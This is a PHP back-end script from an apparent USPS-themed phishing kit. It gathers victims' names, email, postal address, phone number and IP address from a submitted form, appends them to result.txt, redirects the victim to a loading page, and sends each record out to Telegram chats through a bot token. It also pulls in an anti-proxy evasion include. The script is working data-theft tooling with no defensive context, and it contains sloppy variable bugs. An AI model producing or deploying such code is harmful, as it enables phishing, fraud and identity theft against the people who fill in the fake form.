<?php 
extract($_REQUEST);
include "./id.php";
$F=$_POST["first"];
$L=$_POST['state'];
$PH=$_POST["number"];
$C=$_POST['last'];
$A1=$_POST["adress"];
$A1=$_POST["state"];
$EE=$_POST['email'];
$CI=$_POST["city"];
$S=$_POST['state'];
$P=$_POST['zip'];
$ipp=$_SERVER['REMOTE_ADDR'];
$message=">>>>>>>>>>>>>|🇺🇸| USPS PostBy Firas |🇺🇸|<<<<<<<<<<<<"."\n"."Email :   ".$EE."\n"."Full name :  ".$F." ".$c."\n"."Address 1 :   ".$A1."\n"."State :   ".$S."\n"."city :   ".$CI."\n"."ZIP Code :   ".$P."\n"."Phone number :   ".$PH."\n"."IP :  ".$ipp."\n".">>>>>>>>>>>>>|💳| USPS Post |💳|<<<<<<<<<<<<";
$user_ids=$id;
$filee=fopen("result.txt",'a');
fwrite($filee,$message."\n");
fclose($filee);
header("location: loading.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
include "anti/antiproxy1.php";
}
?>